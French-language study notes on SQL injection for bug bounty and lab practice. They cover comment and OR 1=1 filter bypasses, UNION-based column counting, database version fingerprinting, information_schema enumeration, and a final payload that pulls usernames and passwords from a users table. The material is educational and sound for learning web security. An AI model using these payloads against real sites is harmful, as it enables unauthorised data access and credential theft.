
## 🛒 Exemple d’application

Imagine une application e-commerce qui affiche les produits par catégorie.

Quand l’utilisateur clique sur **Gifts**, le navigateur appelle :

https://insecure-website.com/products?category=Gifts

---

## 🗄 Requête SQL générée

Le backend exécute une requête similaire :

SELECT * FROM products   
WHERE category = 'Gifts'   
AND released = 1

### Signification

La base de données renvoie :

tous les produits (*)  
de la table products  
dont la catégorie = Gifts  
et released = 1

---

## 🔒 Restriction appliquée

La condition :

released = 1

sert à **masquer les produits non commercialisés**.

On peut supposer :

released = 1 → produit publié  
released = 0 → produit caché

---

# 💥 Exploitation avec SQL Injection

Si l’application ne filtre pas l’entrée utilisateur, un attaquant peut modifier le paramètre.

---

## Injection avec commentaire SQL

Payload :

Gifts'--

URL :

https://insecure-website.com/products?category=Gifts'--

---

### Requête SQL obtenue

SELECT * FROM products   
WHERE category = 'Gifts'--'   
AND released = 1

Le symbole :

--

est un **commentaire SQL**.

Tout ce qui suit est ignoré.

La requête réellement exécutée devient :

SELECT * FROM products   
WHERE category = 'Gifts'

➡️ La restriction disparaît.

Résultat :

les produits non commercialisés deviennent visibles

---

# ⚡ Injection avec condition logique

Payload :

Gifts' OR 1=1--

URL :

https://insecure-website.com/products?category=Gifts'+OR+1=1--

---

### Requête SQL obtenue

SELECT * FROM products   
WHERE category = 'Gifts' OR 1=1--'   
AND released = 1

---

### Pourquoi cela fonctionne

La condition :

1=1

est **toujours vraie**.

Donc la logique devient :

category = 'Gifts' OR TRUE

➡️ La base de données renvoie **toutes les lignes de la table**.

---

# ⚠️ Avertissement

Une condition comme :

OR 1=1

peut être dangereuse dans certaines requêtes.

Exemple :

DELETE FROM users WHERE id = 5 OR 1=1

Résultat :

toutes les lignes supprimées

C’est pour cela qu’il faut être prudent lors des tests.

---

# 🌐 Comprendre le `?` dans une URL

Dans une URL :

/products?category=Gifts

Le symbole :

?

marque le début des **paramètres de requête (query parameters)**.

Structure :

page?paramètre=valeur

Exemple :

/products?category=Gifts

signifie :

page = /products  
paramètre = category  
valeur = Gifts

---

# 🔎 Paramètres multiples

Les paramètres sont séparés par :

&

Exemple :

/products?category=Gifts&page=2&sort=price

Interprétation :

category = Gifts  
page = 2  
sort = price

---

# 🧠 Importance en bug bounty

Les paramètres après `?` sont souvent :

contrôlés par l'utilisateur

Donc ils peuvent être manipulés.

Exemples de tests :

/products?id=1  
/products?id=2  
/products?id=1'  
/products?id=1 OR 1=1

Ces paramètres peuvent être vulnérables à :

- SQL Injection
    
- IDOR
    
- Path traversal
    
- Business logic flaws
    

---

# ⭐ Concept important

Dans le bug bounty, les paramètres d’URL représentent souvent :

les points d’entrée vers le backend

C’est pourquoi ils sont toujours testés en priorité.


# 🌐 Query Parameters (paramètres de requête)

## Définition

Les **query parameters** sont les paramètres présents dans une URL **après le symbole `?`**.

Structure générale :

page?paramètre=valeur

Exemple :

/products?category=Gifts

Interprétation :

page appelée → /products  
paramètre → category  
valeur → Gifts

---

# 🔍 Paramètres multiples

Plusieurs paramètres peuvent être envoyés dans la même URL.

Ils sont séparés par :

&

Exemple :

/products?category=Gifts&page=2&sort=price

Paramètres envoyés au serveur :

category = Gifts  
page = 2  
sort = price

---

# 🧠 Comment le backend interprète ces paramètres

Quand une requête arrive :

GET /products?category=Gifts

Le backend récupère la valeur :

category = Gifts

Puis il l’utilise souvent dans une requête SQL :

SELECT * FROM products  
WHERE category = 'Gifts'  
AND released = 1

Donc la valeur envoyée par l’utilisateur devient **une partie de la requête SQL**.

---

# ⚠️ Pourquoi c’est important en bug bounty

Les **query parameters sont contrôlés par l’utilisateur**.

Cela signifie qu’ils peuvent être manipulés.

Exemples :

/products?id=1  
/products?id=2  
/products?id=5

Ou tester :

/products?id=1'  
/products?id=1 OR 1=1  
/products?id=1--

Ces manipulations permettent de détecter :

- SQL injection
    
- IDOR
    
- Path traversal
    
- Business logic flaws
    

---

# 🧠 Schéma mental d’une requête web

Lorsqu’un utilisateur envoie une requête :

/products?category=Gifts

le processus est généralement :

Navigateur  
↓  
Requête HTTP  
↓  
Backend (serveur)  
↓  
Requête SQL  
↓  
Base de données  
↓  
Réponse HTTP  
↓  
Navigateur

---

# 📊 Exemple complet

### Requête utilisateur

/products?category=Gifts

---

### Backend

Le serveur récupère :

category = Gifts

---

### Requête SQL générée

SELECT * FROM products  
WHERE category = 'Gifts'  
AND released = 1

---

### Base de données

La base renvoie :

les produits correspondants

---

### Réponse au navigateur

Le serveur affiche la page avec les produits.

---

# ⭐ Concept clé à retenir

Dans le bug bounty :

les query parameters sont souvent des points d'entrée vers le backend

C’est pour cela que les hunters testent toujours :

ids  
categories  
filters  
search  
user  
order

car ces paramètres influencent souvent **les décisions du serveur**.

# 🧠 Pattern mental — Repérer rapidement une SQL Injection

Quand un hunter voit une requête HTTP, il se pose immédiatement la question :

Est-ce que cette valeur utilisateur est utilisée dans une requête SQL ?

Le schéma mental est généralement :

Utilisateur  
↓  
Requête HTTP  
↓  
Paramètre contrôlé par l’utilisateur  
↓  
Backend  
↓  
Requête SQL  
↓  
Base de données

Si une valeur utilisateur est injectée dans la requête SQL **sans validation**, une SQL injection est possible.

---

# 🔎 Les endroits à tester en priorité

Les hunters testent toujours certains paramètres.

### 1️⃣ Identifiants

/product?id=10  
/user?id=7421  
/order?id=52

Ces paramètres sont souvent utilisés dans :

SELECT * FROM products WHERE id = 10

Tests typiques :

10'  
10 OR 1=1  
10--

---

### 2️⃣ Filtres

Exemple :

/products?category=Gifts

Backend :

SELECT * FROM products WHERE category = 'Gifts'

Tests :

Gifts'  
Gifts'--  
Gifts' OR 1=1--

---

### 3️⃣ Recherche

Exemple :

/search?q=phone

Backend :

SELECT * FROM products WHERE name LIKE '%phone%'

Tests :

phone'  
phone' OR 1=1--

---

### 4️⃣ Tri ou ordre

Exemple :

/products?sort=price

Backend :

SELECT * FROM products ORDER BY price

Ce type de paramètre peut aussi être vulnérable.

---

# ⚠️ Signes qui indiquent souvent une SQL injection

Lors des tests, certains comportements sont révélateurs :

erreurs SQL  
messages d’erreur inhabituels  
réponses différentes selon le payload  
temps de réponse anormal

Exemple :

OR 1=1 → affiche tout  
OR 1=2 → affiche rien

---

# ⭐ Réflexe de hunter

Quand tu vois une URL comme :

/products?id=5

Le réflexe doit être :

Est-ce que cette valeur est utilisée dans une requête SQL ?

Puis tester immédiatement :

'  
--  
OR 1=1

---

# 🎯 Idée importante

La SQL injection apparaît presque toujours lorsque :

une valeur contrôlée par l’utilisateur est directement insérée dans une requête SQL

sans validation ni paramétrisation.

---

💡 Petit conseil pour tes labs :  
à chaque fois que tu vois :

?  
id=  
category=  
search=  
filter=

considère cela comme **un point d’entrée potentiel pour une SQL injection**.


# 🧪 SQL Injection — UNION Attacks

## 🎯 Principe

Une **UNION SQL injection** permet de récupérer des données **d'autres tables de la base de données**.

Elle fonctionne lorsque :

les résultats de la requête SQL sont affichés dans la réponse de l'application

Dans ce cas, un attaquant peut **ajouter une seconde requête SQL**.

---

# 🔎 Le mot-clé `UNION`

Le mot-clé SQL :

UNION

permet de **fusionner les résultats de plusieurs requêtes SELECT**.

Exemple :

SELECT a, b FROM table1  
UNION  
SELECT c, d FROM table2

Résultat :

un seul tableau de résultats  
contenant les données des deux requêtes

---

# ⚠️ Conditions pour qu'une attaque UNION fonctionne

Deux règles doivent être respectées :

### 1️⃣ Même nombre de colonnes

Chaque requête doit renvoyer :

le même nombre de colonnes

Exemple valide :

SELECT name, price FROM products  
UNION  
SELECT username, password FROM users

---

### 2️⃣ Types de données compatibles

Les colonnes doivent contenir des **types de données compatibles**.

Exemple :

texte avec texte  
nombre avec nombre

---

# 🔍 Étape 1 — Trouver le nombre de colonnes

Avant d'utiliser UNION, il faut connaître :

le nombre de colonnes dans la requête originale

---

# 🧪 Méthode 1 — `ORDER BY`

On injecte :

' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--

Principe :

ORDER BY trie les résultats par colonne

Si la requête contient **2 colonnes** :

ORDER BY 1 → OK  
ORDER BY 2 → OK  
ORDER BY 3 → ERREUR

L'erreur indique que :

il n'existe pas de colonne 3

Donc :

la requête contient 2 colonnes

---

# 🧪 Méthode 2 — `UNION SELECT NULL`

Une autre méthode consiste à tester :

' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--

Principe :

le nombre de valeurs doit correspondre au nombre de colonnes

---

### Exemple

Si la requête contient **2 colonnes** :

' UNION SELECT NULL--

→ erreur

' UNION SELECT NULL,NULL--

→ fonctionne

Donc :

la requête contient 2 colonnes

---

# ❓ Pourquoi utiliser `NULL`

On utilise :

NULL

car :

NULL est compatible avec presque tous les types de données

Cela augmente les chances que la requête fonctionne.

---

# 🔎 Que se passe-t-il quand le nombre de colonnes est correct ?

Lorsque le nombre de colonnes correspond :

la base de données ajoute une ligne supplémentaire dans le résultat

Cette ligne contient :

NULL | NULL | NULL

Selon l'application :

- une nouvelle ligne apparaît
    
- un contenu étrange apparaît
    
- une erreur peut apparaître
    

---

# ⚠️ Réactions possibles de l'application

Selon la configuration :

erreur SQL visible  
erreur générique  
aucun résultat  
contenu supplémentaire

Il faut donc **observer attentivement les différences dans la réponse HTTP**.

---

# 🧠 Workflow mental d'une UNION SQLi

Lors d'un test :

1️⃣ identifier le paramètre injectable  
2️⃣ trouver le nombre de colonnes  
3️⃣ trouver les colonnes affichées  
4️⃣ injecter une requête UNION  
5️⃣ récupérer des données (users, passwords, etc.)

---

# ⭐ Exemple typique d'attaque

Requête originale :

SELECT name, price  
FROM products  
WHERE category = 'Gifts'

Payload :

' UNION SELECT username,password FROM users--

Requête finale :

SELECT name, price  
FROM products  
WHERE category = 'Gifts'  
  
UNION  
  
SELECT username,password FROM users

Résultat :

les identifiants utilisateurs apparaissent dans la page

---

# 🧠 Concept clé

Une **UNION SQL injection** permet :

d'afficher des données d'autres tables

comme :

users  
passwords  
emails  
tokens

---

# 📌 Résumé rapide

Une attaque UNION nécessite :

même nombre de colonnes  
types de données compatibles  
résultats visibles dans la réponse


# 🗄️ SQL Injection — Identifier la base de données et explorer son contenu

## 🔎 Identifier le type et la version de la base de données

Lorsqu’une application est vulnérable à une **SQL injection**, il est possible d’identifier :

- le **type de base de données**
    
- la **version exacte**
    

Cela se fait en injectant des requêtes **spécifiques à chaque moteur SQL**.

### Requêtes pour identifier la version

|Base de données|Requête|
|---|---|
|Microsoft SQL Server / MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

### Exemple avec SQL injection

Payload :

' UNION SELECT @@version--

La requête backend devient :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT @@version

La réponse peut afficher :

Microsoft SQL Server 2016

➡️ Cela permet de savoir **quel moteur SQL est utilisé**.

---

# 📚 Explorer le contenu de la base de données

Une fois la base identifiée, on peut **énumérer les tables et colonnes**.

La plupart des bases (sauf Oracle) possèdent un **schéma système** :

information_schema

Ce schéma contient des informations sur :

- les tables
    
- les colonnes
    
- les types de données
    

---

# 🧾 Lister les tables de la base

Requête SQL :

SELECT * FROM information_schema.tables

Résultat possible :

|TABLE_NAME|
|---|
|Products|
|Users|
|Feedback|

➡️ Cela révèle les **tables présentes dans la base**.

---

# 📑 Lister les colonnes d’une table

Une fois une table intéressante trouvée (ex : `Users`), on peut afficher ses colonnes.

Requête SQL :

SELECT * FROM information_schema.columns   
WHERE table_name = 'Users'

Résultat possible :

|COLUMN_NAME|DATA_TYPE|
|---|---|
|UserId|int|
|Username|varchar|
|Password|varchar|

➡️ On découvre les **champs sensibles**.

---

# 🎯 Étapes typiques d’une SQLi de lecture de données

1️⃣ Trouver l’injection SQL  
2️⃣ Trouver le **nombre de colonnes**  
3️⃣ Trouver les **colonnes texte affichées**  
4️⃣ Identifier le **type de base de données**  
5️⃣ Lister les **tables** (`information_schema.tables`)  
6️⃣ Lister les **colonnes** (`information_schema.columns`)  
7️⃣ Extraire les **données sensibles**

Exemple final :

' UNION SELECT username,password FROM users--

---

# 🧠 Modèle mental important

La base de données ressemble à :

Database  
   │  
   ├── Tables  
   │      ├── users  
   │      ├── products  
   │      └── orders  
   │  
   └── Columns  
          ├── username  
          ├── password  
          └── email

La SQL injection permet de **naviguer dans cette structure** et d’extraire les données.

---

